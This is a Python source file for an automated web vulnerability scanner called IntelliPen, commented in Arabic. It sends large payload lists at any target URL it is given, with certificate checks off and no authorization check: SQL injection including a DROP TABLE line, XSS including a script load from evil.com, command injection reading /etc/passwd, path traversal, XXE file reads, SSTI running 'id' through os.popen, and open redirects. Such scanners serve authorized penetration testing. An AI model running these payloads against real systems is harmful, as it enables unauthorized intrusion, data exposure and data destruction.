"""
IntelliPen - Vulnerability Scanner Engine
محرك فحص الثغرات - يكتشف الثغرات الأمنية الشائعة والمتقدمة
"""

import requests
import re
import json
import time
import threading
from urllib.parse import urlparse, urljoin, urlencode, quote, parse_qs, urlunparse
from bs4 import BeautifulSoup
from datetime import datetime
import concurrent.futures
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
}

# ===== حمولات SQL Injection =====
SQL_PAYLOADS = [
    # Classic
    "'", '"', "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
    "' OR 1=1#", "' OR 1=1/*", "admin'--", "admin'#",
    "' OR 'x'='x", "') OR ('1'='1", "1' ORDER BY 1--",
    "1' ORDER BY 2--", "1' ORDER BY 3--",
    # Union-based
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--", "' UNION ALL SELECT NULL--",
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1; SELECT SLEEP(5)--",
    # Blind
    "' AND SLEEP(3)--", "' AND 1=1--", "' AND 1=2--",
    "1 AND SLEEP(3)", "1' AND SLEEP(3)--",
    # NoSQL
    "{'$gt': ''}", "{'$ne': null}", "[$ne]=1",
    # Second-order
    "\\", "\\\\", "'; DROP TABLE users--",
]

SQL_ERROR_PATTERNS = [
    r"sql syntax.*mysql", r"warning.*mysql_", r"valid mysql result",
    r"mysqlclient\.", r"mysql_fetch_array\(", r"mysql_num_rows\(",
    r"pg_exec\(", r"pg_query\(", r"postgresql.*error",
    r"warning.*pg_", r"valid postgresql result", r"npgsql\.",
    r"driver.*sql.*server", r"ole db.*sql server", r"(\W|\A)sql server.*driver",
    r"warning.*mssql_", r"(\W|\A)mssql_", r"microsoft sql native client error",
    r"odbc.*driver", r"odbc.*error", r"microsoft ole db provider for odbc drivers",
    r"oracle.*driver", r"warning.*oci_", r"warning.*ora_",
    r"oracle.*error", r"quoted string not properly terminated",
    r"sqlite_.*error", r"warning.*sqlite_", r"sqlite3\.",
    r"syntax error", r"unclosed quotation mark",
    r"you have an error in your sql syntax",
    r"supplied argument is not a valid mysql",
    r"column count doesn't match",
    r"the used select statements have a different number of columns",
]

# ===== حمولات XSS =====
XSS_PAYLOADS = [
    # Basic
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    # Attribute-based
    "\" onmouseover=\"alert('XSS')\"",
    "' onmouseover='alert(1)'",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    # Tag-based
    "<svg onload=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    # Encoded
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    # DOM-based
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    # Filter bypass
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script >alert(1)</script >",
    "<<script>alert(1)//<</script>",
    "<script/src=//evil.com/xss.js>",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e",
]

XSS_DETECTION = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "alert('XSS')",
    "alert(1)",
    "onerror=alert",
    "onload=alert",
]

# ===== حمولات Command Injection =====
CMD_PAYLOADS = [
    "; ls", "; ls -la", "; id", "; whoami", "; cat /etc/passwd",
    "| ls", "| id", "| whoami", "| cat /etc/passwd",
    "& ls", "& id", "& whoami",
    "`id`", "`whoami`", "`ls`",
    "$(id)", "$(whoami)", "$(ls)",
    "; ping -c 1 127.0.0.1",
    "| ping -c 1 127.0.0.1",
    "; sleep 3", "| sleep 3", "& sleep 3",
    "1; ls", "1 | ls", "1 & ls",
    # Windows
    "& dir", "& whoami", "& ipconfig",
    "| dir", "| whoami",
]

CMD_INDICATORS = [
    "root:", "bin:", "daemon:", "nobody:",  # /etc/passwd
    "uid=", "gid=", "groups=",  # id output
    "total ", "drwx", "-rw-",  # ls output
    "Directory of", "Volume in drive",  # Windows dir
    "Windows IP Configuration",  # ipconfig
]

# ===== حمولات Path Traversal =====
PATH_TRAVERSAL_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd",
    "%2e%2e%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
    "....//....//etc/passwd", "..\\..\\windows\\win.ini",
    "..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "C:\\Windows\\win.ini", "C:\\boot.ini",
    "file:///etc/passwd",
]

PATH_TRAVERSAL_INDICATORS = [
    "root:x:", "root:!", "daemon:x:", "bin:x:",
    "[boot loader]", "[operating systems]",
    "[fonts]", "[extensions]",
    "for 16-bit app support",
]

# ===== حمولات IDOR =====
IDOR_PARAMS = ["id", "user_id", "uid", "userid", "account", "account_id",
               "profile", "profile_id", "order", "order_id", "invoice",
               "doc", "document", "file", "filename", "path", "page",
               "record", "item", "object", "ref", "reference"]

# ===== حمولات XXE =====
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
]

# ===== حمولات SSTI =====
SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
    "{{7*'7'}}", "{{config}}", "{{self.__dict__}}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
]

SSTI_INDICATORS = ["49", "7777777", "49.0"]


class VulnerabilityScanner:
    def __init__(self, target_url, recon_data=None, timeout=10):
        self.target_url = target_url.rstrip("/")
        self.parsed = urlparse(target_url)
        self.domain = self.parsed.netloc
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.timeout = timeout
        self.recon_data = recon_data or {}
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.verify = False
        self.lock = threading.Lock()

    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        icons = {"INFO": "ℹ️", "SUCCESS": "✅", "FOUND": "🚨", "WARNING": "⚠️", "ERROR": "❌", "CRITICAL": "🔴"}
        print(f"[{timestamp}] [{level}] {icons.get(level, '')} {msg}")

    def add_vulnerability(self, vuln_type, url, parameter, payload, evidence, severity, description, cvss=0.0):
        """إضافة ثغرة مكتشفة"""
        vuln = {
            "id": len(self.vulnerabilities) + 1,
            "type": vuln_type,
            "url": url,
            "parameter": parameter,
            "payload": payload,
            "evidence": evidence[:500] if evidence else "",
            "severity": severity,
            "cvss": cvss,
            "description": description,
            "timestamp": datetime.now().isoformat(),
            "cwe": self._get_cwe(vuln_type),
        }
        with self.lock:
            self.vulnerabilities.append(vuln)
        self.log(f"VULNERABILITY FOUND: [{severity}] {vuln_type} at {url} (param: {parameter})", "FOUND")

    def _get_cwe(self, vuln_type):
        cwe_map = {
            "SQL Injection": "CWE-89",
            "XSS": "CWE-79",
            "Command Injection": "CWE-78",
            "Path Traversal": "CWE-22",
            "IDOR": "CWE-639",
            "XXE": "CWE-611",
            "SSTI": "CWE-94",
            "Open Redirect": "CWE-601",
            "Missing Security Headers": "CWE-693",
            "Information Disclosure": "CWE-200",
            "Sensitive File Exposure": "CWE-538",
            "CSRF": "CWE-352",
            "Broken Authentication": "CWE-287",
        }
        return cwe_map.get(vuln_type, "CWE-Unknown")

    def test_sql_injection(self, url, params):
        """اختبار حقن SQL"""
        self.log(f"Testing SQL Injection on {url} (params: {list(params.keys())})")
        for param_name in params:
            for payload in SQL_PAYLOADS[:15]:  # أول 15 حمولة للسرعة
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload
                    r = self.session.get(url, params=test_params, timeout=self.timeout)
                    response_lower = r.text.lower()

                    # كشف الأخطاء
                    for pattern in SQL_ERROR_PATTERNS:
                        if re.search(pattern, response_lower):
                            self.add_vulnerability(
                                "SQL Injection",
                                url, param_name, payload,
                                f"SQL error pattern detected: {pattern}",
                                "CRITICAL", 
                                f"SQL Injection vulnerability in parameter '{param_name}'. Database error exposed.",
                                cvss=9.8
                            )
                            break

                    # كشف Time-based Blind
                    if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                        start = time.time()
                        r2 = self.session.get(url, params=test_params, timeout=15)
                        elapsed = time.time() - start
                        if elapsed >= 2.5:
                            self.add_vulnerability(
                                "SQL Injection (Time-Based Blind)",
                                url, param_name, payload,
                                f"Response delayed by {elapsed:.2f}s",
                                "CRITICAL",
                                f"Time-based blind SQL injection in parameter '{param_name}'.",
                                cvss=9.8
                            )
                except Exception as e:
                    pass

    def test_xss(self, url, params, forms=None):
        """اختبار XSS"""
        self.log(f"Testing XSS on {url}")
        
        # اختبار المعاملات في URL
        for param_name in params:
            for payload in XSS_PAYLOADS[:10]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload
                    r = self.session.get(url, params=test_params, timeout=self.timeout)
                    
                    for indicator in XSS_DETECTION:
                        if indicator in r.text:
                            self.add_vulnerability(
                                "XSS (Reflected)",
                                url, param_name, payload,
                                f"Payload reflected in response: {indicator}",
                                "HIGH",
                                f"Reflected XSS in parameter '{param_name}'. Script injection possible.",
                                cvss=7.4
                            )
                            break
                except:
                    pass

        # اختبار النماذج
        if forms:
            for form in forms:
                action = form.get("action", "")
                method = form.get("method", "GET")
                form_url = urljoin(self.base_url, action) if action else url
                
                for inp in form.get("inputs", []):
                    if inp.get("type") in ["text", "search", "email", "url", "textarea", ""]:
                        for payload in XSS_PAYLOADS[:5]:
                            try:
                                data = {i["name"]: "test" for i in form["inputs"] if i.get("name")}
                                if inp.get("name"):
                                    data[inp["name"]] = payload
                                
                                if method == "POST":
                                    r = self.session.post(form_url, data=data, timeout=self.timeout)
                                else:
                                    r = self.session.get(form_url, params=data, timeout=self.timeout)
                                
                                for indicator in XSS_DETECTION:
                                    if indicator in r.text:
                                        self.add_vulnerability(
                                            "XSS (Reflected via Form)",
                                            form_url, inp.get("name", "unknown"), payload,
                                            f"Payload reflected in form response",
                                            "HIGH",
                                            f"Reflected XSS via form input '{inp.get('name')}'.",
                                            cvss=7.4
                                        )
                                        break
                            except:
                                pass

    def test_command_injection(self, url, params):
        """اختبار حقن الأوامر"""
        self.log(f"Testing Command Injection on {url}")
        for param_name in params:
            for payload in CMD_PAYLOADS[:10]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload
                    r = self.session.get(url, params=test_params, timeout=self.timeout)
                    
                    for indicator in CMD_INDICATORS:
                        if indicator in r.text:
                            self.add_vulnerability(
                                "Command Injection",
                                url, param_name, payload,
                                f"Command output detected: {indicator}",
                                "CRITICAL",
                                f"OS Command Injection in parameter '{param_name}'. Remote code execution possible.",
                                cvss=10.0
                            )
                            break
                    
                    # Time-based detection
                    if "sleep" in payload.lower():
                        start = time.time()
                        r2 = self.session.get(url, params=test_params, timeout=15)
                        elapsed = time.time() - start
                        if elapsed >= 2.5:
                            self.add_vulnerability(
                                "Command Injection (Time-Based)",
                                url, param_name, payload,
                                f"Response delayed by {elapsed:.2f}s",
                                "CRITICAL",
                                f"Time-based command injection in parameter '{param_name}'.",
                                cvss=10.0
                            )
                except:
                    pass

    def test_path_traversal(self, url, params):
        """اختبار اجتياز المسار"""
        self.log(f"Testing Path Traversal on {url}")
        for param_name in params:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload
                    r = self.session.get(url, params=test_params, timeout=self.timeout)
                    
                    for indicator in PATH_TRAVERSAL_INDICATORS:
                        if indicator in r.text:
                            self.add_vulnerability(
                                "Path Traversal",
                                url, param_name, payload,
                                f"File content detected: {indicator}",
                                "HIGH",
                                f"Path traversal in parameter '{param_name}'. Sensitive file access possible.",
                                cvss=8.1
                            )
                            break
                except:
                    pass

    def test_ssti(self, url, params):
        """اختبار حقن قوالب من جانب الخادم"""
        self.log(f"Testing SSTI on {url}")
        for param_name in params:
            for payload in SSTI_PAYLOADS[:5]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload
                    r = self.session.get(url, params=test_params, timeout=self.timeout)
                    
                    for indicator in SSTI_INDICATORS:
                        if indicator in r.text:
                            self.add_vulnerability(
                                "SSTI (Server-Side Template Injection)",
                                url, param_name, payload,
                                f"Template evaluation detected: {indicator}",
                                "CRITICAL",
                                f"SSTI in parameter '{param_name}'. Remote code execution via template engine.",
                                cvss=9.8
                            )
                            break
                except:
                    pass

    def test_open_redirect(self, url, params):
        """اختبار إعادة التوجيه المفتوح"""
        redirect_payloads = [
            "https://evil.com", "//evil.com", "///evil.com",
            "https://evil.com%2F%2F", "https://evil.com%00",
            "https://evil.com@trusted.com",
        ]
        redirect_params = ["redirect", "url", "next", "return", "returnUrl",
                          "redirect_uri", "callback", "continue", "goto", "target"]
        
        for param_name in params:
            if any(rp.lower() in param_name.lower() for rp in redirect_params):
                for payload in redirect_payloads:
                    try:
                        test_params = dict(params)
                        test_params[param_name] = payload
                        r = self.session.get(url, params=test_params, timeout=self.timeout, allow_redirects=False)
                        
                        if r.status_code in [301, 302, 303, 307, 308]:
                            location = r.headers.get("Location", "")
                            if "evil.com" in location:
                                self.add_vulnerability(
                                    "Open Redirect",
                                    url, param_name, payload,
                                    f"Redirected to: {location}",
                                    "MEDIUM",
                                    f"Open redirect in parameter '{param_name}'. Phishing attacks possible.",
                                    cvss=6.1
                                )
                    except:
                        pass

    def test_security_headers(self):
        """فحص رؤوس الأمان المفقودة"""
        self.log("Testing security headers...")
        try:
            r = self.session.get(self.target_url, timeout=self.timeout)
            headers = r.headers
            
            security_headers = {
                "X-Frame-Options": ("Clickjacking protection", "MEDIUM", 6.1),
                "X-XSS-Protection": ("XSS filter header", "LOW", 3.1),
                "X-Content-Type-Options": ("MIME sniffing protection", "LOW", 3.1),
                "Strict-Transport-Security": ("HSTS header", "MEDIUM", 5.9),
                "Content-Security-Policy": ("CSP header", "MEDIUM", 6.1),
                "Referrer-Policy": ("Referrer policy", "LOW", 3.1),
            }
            
            for header, (desc, severity, cvss) in security_headers.items():
                if header not in headers:
                    self.add_vulnerability(
                        "Missing Security Headers",
                        self.target_url, header, "N/A",
                        f"Header '{header}' is missing",
                        severity,
                        f"Missing {desc} header '{header}'. Increases attack surface.",
                        cvss=cvss
                    )
        except Exception as e:
            self.log(f"Security headers test failed: {e}", "ERROR")

    def test_sensitive_file_exposure(self, sensitive_files):
        """فحص تعرض الملفات الحساسة"""
        for file_info in sensitive_files:
            self.add_vulnerability(
                "Sensitive File Exposure",
                file_info["url"], "N/A", "Direct access",
                f"File accessible: {file_info['preview'][:100]}",
                "CRITICAL",
                f"Sensitive file '{file_info['file']}' is publicly accessible.",
                cvss=9.1
            )

    def test_idor(self, links):
        """اختبار الإشارة المباشرة للكائنات غير الآمنة"""
        self.log("Testing IDOR vulnerabilities...")
        idor_patterns = re.compile(r'[?&](' + '|'.join(IDOR_PARAMS) + r')=(\d+)', re.IGNORECASE)
        
        tested_urls = set()
        for link in links[:50]:  # فحص أول 50 رابط
            matches = idor_patterns.findall(link)
            for param, value in matches:
                if link in tested_urls:
                    continue
                tested_urls.add(link)
                
                try:
                    # جلب الاستجابة الأصلية
                    r1 = self.session.get(link, timeout=self.timeout)
                    
                    # تعديل المعرف
                    modified_url = re.sub(
                        f'([?&]{param}=){value}',
                        f'\\g<1>{int(value)+1}',
                        link
                    )
                    r2 = self.session.get(modified_url, timeout=self.timeout)
                    
                    # إذا كانت الاستجابتان مختلفتان وكلتاهما ناجحتان
                    if (r1.status_code == 200 and r2.status_code == 200 and
                            len(r1.text) != len(r2.text) and len(r2.text) > 100):
                        self.add_vulnerability(
                            "IDOR (Insecure Direct Object Reference)",
                            link, param, f"{param}={int(value)+1}",
                            f"Different response for modified ID: {len(r1.text)} vs {len(r2.text)} bytes",
                            "HIGH",
                            f"Potential IDOR in parameter '{param}'. Unauthorized data access possible.",
                            cvss=8.1
                        )
                except:
                    pass

    def test_csrf(self, forms):
        """اختبار CSRF"""
        self.log("Testing CSRF vulnerabilities...")
        csrf_tokens = ["csrf", "token", "_token", "csrftoken", "csrf_token",
                      "authenticity_token", "__RequestVerificationToken"]
        
        for form in forms:
            if form.get("method") == "POST":
                has_csrf = False
                for inp in form.get("inputs", []):
                    if any(csrf.lower() in inp.get("name", "").lower() for csrf in csrf_tokens):
                        has_csrf = True
                        break
                
                if not has_csrf:
                    action = form.get("action", self.target_url)
                    form_url = urljoin(self.base_url, action)
                    self.add_vulnerability(
                        "CSRF (Missing Token)",
                        form_url, "form", "N/A",
                        f"POST form without CSRF token: {form_url}",
                        "MEDIUM",
                        f"POST form at '{form_url}' lacks CSRF protection token.",
                        cvss=6.5
                    )

    def test_information_disclosure(self):
        """اختبار كشف المعلومات"""
        self.log("Testing information disclosure...")
        error_paths = [
            "/nonexistent-page-12345", "/test.php?id=1'",
            "/api/test", "/?debug=1", "/?test=1",
        ]
        
        error_indicators = [
            "stack trace", "traceback", "exception", "error in",
            "warning:", "notice:", "fatal error",
            "mysql_connect", "pg_connect", "sqlite_open",
            "file_get_contents", "include(", "require(",
            "undefined variable", "undefined index",
            "call to undefined function",
            "syntax error", "parse error",
        ]
        
        for path in error_paths:
            try:
                url = self.base_url + path
                r = self.session.get(url, timeout=self.timeout)
                response_lower = r.text.lower()
                
                for indicator in error_indicators:
                    if indicator in response_lower:
                        self.add_vulnerability(
                            "Information Disclosure",
                            url, "N/A", path,
                            f"Error/debug info detected: {indicator}",
                            "MEDIUM",
                            f"Application exposes sensitive error/debug information.",
                            cvss=5.3
                        )
                        break
            except:
                pass

    def run(self, recon_results=None):
        """تشغيل عملية الفحص الكاملة"""
        self.log(f"🔍 Starting IntelliPen Vulnerability Scanner on: {self.target_url}", "INFO")
        self.log("=" * 60)
        
        start_time = time.time()
        
        if recon_results is None:
            recon_results = self.recon_data
        
        # جمع نقاط الاختبار
        forms = recon_results.get("forms", [])
        links = recon_results.get("links", [])
        sensitive_files = recon_results.get("sensitive_files", [])
        
        # 1. فحص رؤوس الأمان
        self.test_security_headers()
        
        # 2. فحص الملفات الحساسة
        if sensitive_files:
            self.test_sensitive_file_exposure(sensitive_files)
        
        # 3. فحص كشف المعلومات
        self.test_information_disclosure()
        
        # 4. فحص CSRF
        if forms:
            self.test_csrf(forms)
        
        # 5. فحص IDOR
        if links:
            self.test_idor(links)
        
        # 6. فحص الروابط التي تحتوي على معاملات
        urls_with_params = []
        for link in links:
            parsed = urlparse(link)
            if parsed.query:
                params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
                urls_with_params.append((link, params))
        
        # إضافة الصفحة الرئيسية
        parsed_main = urlparse(self.target_url)
        if parsed_main.query:
            main_params = {k: v[0] for k, v in parse_qs(parsed_main.query).items()}
            urls_with_params.insert(0, (self.target_url, main_params))
        
        # فحص كل URL يحتوي على معاملات
        for url, params in urls_with_params[:20]:  # أول 20 URL
            self.test_sql_injection(url, params)
            self.test_xss(url, params, forms)
            self.test_command_injection(url, params)
            self.test_path_traversal(url, params)
            self.test_ssti(url, params)
            self.test_open_redirect(url, params)
        
        # فحص النماذج مباشرة (SQL + XSS) حتى بدون معاملات في الروابط
        if forms:
            self.test_xss(self.target_url, {}, forms)
            # فحص SQL Injection عبر النماذج مباشرة
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()
                form_url = urljoin(self.base_url, action) if action else self.target_url
                form_params = {}
                for inp in form.get('inputs', []):
                    if inp.get('name') and inp.get('type') not in ['submit', 'button', 'hidden', 'checkbox', 'radio']:
                        form_params[inp['name']] = inp.get('value', 'test')
                if form_params:
                    self.test_sql_injection(form_url, form_params)
                    self.test_command_injection(form_url, form_params)
                    self.test_path_traversal(form_url, form_params)
        
        # إذا لم تُكتشف معاملات، جرّب معاملات شائعة على الصفحة الرئيسية
        if not urls_with_params and not forms:
            common_params = {'id': '1', 'page': '1', 'search': 'test', 'q': 'test', 'user': 'admin'}
            self.test_sql_injection(self.target_url, common_params)
            self.test_xss(self.target_url, common_params, [])
        
        elapsed = time.time() - start_time
        
        # تصنيف الثغرات حسب الخطورة
        severity_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        for v in self.vulnerabilities:
            severity_count[v["severity"]] = severity_count.get(v["severity"], 0) + 1
        
        summary = {
            "total_vulnerabilities": len(self.vulnerabilities),
            "severity_breakdown": severity_count,
            "scan_duration": f"{elapsed:.2f}s",
            "urls_tested": len(urls_with_params),
            "forms_tested": len(forms),
        }
        
        self.log("=" * 60)
        self.log(f"✅ Scan complete in {elapsed:.2f}s", "SUCCESS")
        self.log(f"🚨 Total vulnerabilities: {len(self.vulnerabilities)}")
        self.log(f"📊 Breakdown: {severity_count}")
        
        return {
            "vulnerabilities": self.vulnerabilities,
            "summary": summary,
        }


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    scanner = VulnerabilityScanner(target)
    results = scanner.run()
    print(json.dumps(results, indent=2, default=str))
